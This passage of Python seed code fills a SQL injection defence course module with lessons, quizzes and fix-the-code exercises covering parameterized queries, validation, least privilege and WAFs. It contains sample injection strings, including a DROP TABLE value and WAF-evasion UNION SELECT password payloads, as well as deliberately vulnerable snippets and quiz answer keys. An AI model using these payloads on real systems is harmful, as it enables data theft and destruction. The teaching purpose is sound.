    l6_1 = Lesson(module_id=m6.id, order_index=1, title="The Defense Pyramid", narrative="**Narrative**: *Defense against SQL injection isn't a single fix — it's a layered strategy. Think of it as a pyramid, where each layer catches what the previous one misses.*\\n**Interactive Visual**: Pyramid diagram (click each layer)\\n**⚠️ Critical**: Parameterized queries are the **only** reliable defense. All other layers are supplements, not replacements.", code_snippet="                    ╱╲\\n                   ╱  ╲\\n                  ╱ WAF ╲         ← Layer 4: Web Application Firewall\\n                 ╱────────╲\\n                ╱ Least    ╲      ← Layer 3: Principle of Least Privilege\\n               ╱ Privilege  ╲\\n              ╱──────────────╲\\n             ╱ Input Validation╲  ← Layer 2: Validate & Sanitize Input\\n            ╱──────────────────╲\\n           ╱  PARAMETERIZED     ╲ ← Layer 1: THE FOUNDATION\\n          ╱   QUERIES            ╲\\n         ╱════════════════════════╲", code_language="", table_data=None)
    db.session.add(l6_1)
    db.session.flush()
    l6_2 = Lesson(module_id=m6.id, order_index=2, title="Layer 1: Parameterized Queries (Prepared Statements)", narrative="**Narrative**: *This is the silver bullet. Parameterized queries separate **code** from **data**. The database engine knows exactly which parts are SQL commands and which parts are user values. Injection becomes impossible.*\\n**How it works**:\\n**Implementation in 5 languages**:", code_snippet="// ❌ VULNERABLE\\nstring query = $\"SELECT * FROM users WHERE username = '{username}'\";\\nSqlCommand cmd = new SqlCommand(query, conn);\\n\\n// ✅ SAFE — Parameterized\\nstring query = \"SELECT * FROM users WHERE username = @username\";\\nSqlCommand cmd = new SqlCommand(query, conn);\\ncmd.Parameters.AddWithValue(\"@username\", username);", code_language="csharp", table_data=None)
    db.session.add(l6_2)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l6_2.id, order_index=1, kind="fix", title="FIX THE CODE", prompt="This Python Flask endpoint is vulnerable. Rewrite it to use parameterized queries:\\n```python\\n@app.route('/search')\\ndef search():\\nterm = request.args.get('q')\\nquery = f\"SELECT * FROM products WHERE name LIKE '%{term}%'\"\\nresults = db.execute(query).fetchall()\\nreturn render_template('results.html', products=results)\\n```\\n**Expected Answer**:\\n```python\\n@app.route('/search')\\ndef search():\\nterm = request.args.get('q')\\nquery = \"SELECT * FROM products WHERE name LIKE ?\"\\nresults = db.execute(query, ('%' + term + '%',)).fetchall()\\nreturn render_template('results.html', products=results)\\n```\\n**Key point**: The `%` wildcards are added to the parameter value, not to the query string. The `?` placeholder ensures the search term is always treated as data.\\n**Common mistake**: Putting `%?%` in the query — this doesn't work because `?` must be a standalone placeholder.\\n---", options=_j([]), correct_answer="", explanation="", hints=_j([])))
    db.session.add(LessonStep(lesson_id=l6_2.id, order_index=2, kind="spot", title="SPOT THE VULNERABILITY", prompt="A developer claims this code is safe because it uses parameterized queries. Is it actually safe?\\n```python\\ntable_name = request.args.get('table')\\nquery = f\"SELECT * FROM {table_name} WHERE id = ?\"\\ncursor.execute(query, (user_id,))\\n```", options=_j([]), correct_answer="NOT SAFE ❌", explanation="*The `id` parameter is properly parameterized, but the **table name** is still injected via string formatting! You cannot parameterize table names, column names, or SQL keywords — only values. An attacker could set `table_name` to `users; DROP TABLE products;--`.*\\n**Fix**: Use a whitelist for table names:\\n```python\\nALLOWED_TABLES = {'products', 'categories', 'reviews'}\\ntable_name = request.args.get('table')\\nif table_name not in ALLOWED_TABLES:\\nabort(400)\\nquery = f\"SELECT * FROM {table_name} WHERE id = ?\"\\ncursor.execute(query, (user_id,))\\n```\\n---", hints=_j([])))
    l6_3 = Lesson(module_id=m6.id, order_index=3, title="Layer 2: Input Validation & Sanitization", narrative="**Narrative**: *Parameterized queries are your main defense, but input validation adds another layer. Validate inputs to ensure they match expected formats.*\\n**Types of validation**:\\n**⚠️ Important**: Input validation alone is **NOT sufficient** defense against SQL injection. It should always be used **alongside** parameterized queries, never as a replacement.", code_snippet=None, code_language=None, table_data=None)
    db.session.add(l6_3)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l6_3.id, order_index=1, kind="mcq", title="MULTIPLE CHOICE", prompt="A developer adds this validation before using the input in a SQL query:\\n```python\\ndef sanitize(input_string):\\nreturn input_string.replace(\"'\", \"''\")  # Escape single quotes\\n```\\nIs this a reliable defense against SQL injection?", options=_opts(("A", "A) Yes, escaping quotes prevents all SQL injection"), ("B", "B) No — it can be bypassed in certain character encodings and doesn't handle all injection types"), ("C", "C) Yes, but only for MySQL databases"), ("D", "D) No — the function should also escape semicolons")), correct_answer="\"B\"", explanation="Manual escaping is fragile. It can be bypassed via:", hints=_j([])))
    l6_4 = Lesson(module_id=m6.id, order_index=4, title="Layer 3: Principle of Least Privilege", narrative="**Narrative**: *Even if an attacker succeeds in injecting SQL, you can limit the damage by restricting what the database account can do.*\\n**Bad practice**:\\n**Good practice**:\\n**Impact comparison**:", code_snippet="-- Create a restricted account for the web app\\nCREATE USER 'webapp_readonly'@'localhost' IDENTIFIED BY 'strong_password';\\n\\n-- Grant ONLY what's needed\\nGRANT SELECT ON webapp_db.products TO 'webapp_readonly'@'localhost';\\nGRANT SELECT ON webapp_db.categories TO 'webapp_readonly'@'localhost';\\nGRANT SELECT, INSERT ON webapp_db.orders TO 'webapp_readonly'@'localhost';\\n\\n-- Explicitly deny dangerous operations\\n-- No DELETE, DROP, FILE, EXECUTE privileges", code_language="sql", table_data=None)
    db.session.add(l6_4)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l6_4.id, order_index=1, kind="dnd", title="DRAG & DROP (Permission Assignment)", prompt="Match each web application function to the **minimum** database permissions it needs:\\n| Application Function | Required Permission |\\n|---------------------|-------------------|\\n| Product search page | `SELECT` on products |\\n| User registration | `INSERT` on users |\\n| Order placement | `SELECT` on products + `INSERT` on orders |\\n| Admin delete user | `DELETE` on users |\\n| Profile update | `UPDATE` on users |\\n**Student drags** permission sets to each function.\\n---", options=_j([]), correct_answer="", explanation="", hints=_j([])))
    l6_5 = Lesson(module_id=m6.id, order_index=5, title="Layer 4: Web Application Firewall (WAF)", narrative="**Narrative**: *A WAF sits between users and your application, analyzing HTTP requests for malicious patterns. It can block common SQL injection payloads before they reach your code.*\\n**How a WAF works**:\\n**Popular WAFs**: ModSecurity, AWS WAF, Cloudflare WAF, Imperva\\n**⚠️ Limitation**: WAFs can be bypassed with advanced encoding, comment insertion, or case manipulation:\\n**This is why WAFs are Layer 4 (supplement), not Layer 1 (foundation).**", code_snippet="-- Standard (blocked by WAF):\\n' UNION SELECT password FROM users--\\n\\n-- Evasion attempt (may bypass WAF):\\n' uNiOn SeLeCt password FrOm users--\\n' /*!UNION*/ /*!SELECT*/ password FROM users--\\n' UNION%0aSELECT password FROM users--", code_language="sql", table_data=None)
    db.session.add(l6_5)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l6_5.id, order_index=1, kind="mcq", title="MULTIPLE CHOICE", prompt="A company relies solely on a WAF to protect against SQL injection and doesn't use parameterized queries. An attacker discovers a bypass for their WAF's rules. What happens?", options=_opts(("A", "A) The database's built-in security will still prevent the injection"), ("B", "B) The application is fully compromised because there are no other defenses"), ("C", "C) The operating system firewall will catch the injection"), ("D", "D) The WAF will learn and adapt to block the bypass")), correct_answer="\"B\"", explanation="Without parameterized queries as the foundation, bypassing the WAF means the application is fully exposed. This is why defense-in-depth is essential — no single layer should be your only protection.", hints=_j([])))
    l6_6 = Lesson(module_id=m6.id, order_index=6, title="Bonus Layer: ORM & Stored Procedures", narrative="**Narrative**: *Two additional tools in your defense arsenal:*\\n**⚠️ Caveat**: ORMs and stored procedures can still be vulnerable if you use raw SQL features within them:", code_snippet="# ❌ Still vulnerable — raw SQL within ORM\\nUser.query.filter(text(f\"name = '{name}'\"))\\n\\n# ✅ Safe — using ORM's built-in filtering\\nUser.query.filter_by(name=name)", code_language="python", table_data=None)
    db.session.add(l6_6)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l6_6.id, order_index=1, kind="fix", title="FIX THE CODE (Comprehensive)", prompt="This Express.js (Node.js) API has three SQL injection vulnerabilities. Fix all of them:\\n**Vulnerable Code**:\\n```javascript\\napp.get('/api/products', (req, res) => {\\nconst search = req.query.q;\\nconst sort = req.query.sort;\\nconst limit = req.query.limit;\\nconst query = `SELECT * FROM products\\nWHERE name LIKE '%${search}%'\\nORDER BY ${sort}\\nLIMIT ${limit}`;\\ndb.query(query, (err, results) => {\\nres.json(results);\\n});\\n});\\n```\\n**Expected Answer**:\\n```javascript\\nconst ALLOWED_SORT_COLUMNS = ['name', 'price', 'created_at', 'rating'];\\napp.get('/api/products', (req, res) => {\\nconst search = req.query.q;\\nconst sort = req.query.sort;\\nconst limit = parseInt(req.query.limit) || 20;\\n// Whitelist sort column\\nconst sortColumn = ALLOWED_SORT_COLUMNS.includes(sort) ? sort : 'name';\\n// Parameterize search, validate limit, whitelist sort\\nconst query = `SELECT * FROM products\\nWHERE name LIKE ?\\nORDER BY ${sortColumn}\\nLIMIT ?`;\\ndb.query(query, [`%${search}%`, limit], (err, results) => {\\nres.json(results);\\n});\\n});\\n```\\n**Fixes applied**:\\n1. **search** → Parameterized with `?`\\n2. **sort** → Whitelisted against allowed column names\\n3. **limit** → Parsed as integer (type validation) + parameterized\\n---", options=_j([]), correct_answer="", explanation="", hints=_j([])))
    l6_7 = Lesson(module_id=m6.id, order_index=7, title="The Defense Checklist", narrative="**Interactive Checklist** (student checks items they would implement):", code_snippet="✅ MUST-HAVE (Non-negotiable)\\n  □ Use parameterized queries for ALL database interactions\\n  □ Never concatenate user input into SQL strings\\n  □ Use least-privilege database accounts\\n\\n✅ SHOULD-HAVE (Strongly recommended)\\n  □ Validate all inputs (type, length, format)\\n  □ Whitelist allowed values for table/column names\\n  □ Use an ORM with proper configuration\\n  □ Disable detailed error messages in production\\n\\n✅ NICE-TO-HAVE (Additional protection)\\n  □ Deploy a WAF with SQL injection rules\\n  □ Implement logging and monitoring for suspicious queries\\n  □ Use stored procedures for complex operations\\n  □ Regular security audits and penetration testing\\n  □ Keep database software up to date", code_language="", table_data=None)
    db.session.add(l6_7)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l6_7.id, order_index=1, kind="mcq", title="MULTIPLE CHOICE (Final Scenario)", prompt="You're reviewing a Python web application. Which combination of defenses provides the STRONGEST protection?", options=_opts(("A", "A) WAF + Input validation + Manual quote escaping"), ("B", "B) Parameterized queries + Least privilege + Input validation + WAF"), ("C", "C) Stored procedures only"), ("D", "D) Input validation + Output encoding + HTTPS")), correct_answer="\"B\"", explanation="This is proper defense-in-depth:", hints=_j([])))

    # ── MODULE 07: Real-World Cases & Final Challenge ──────────────────────────────────
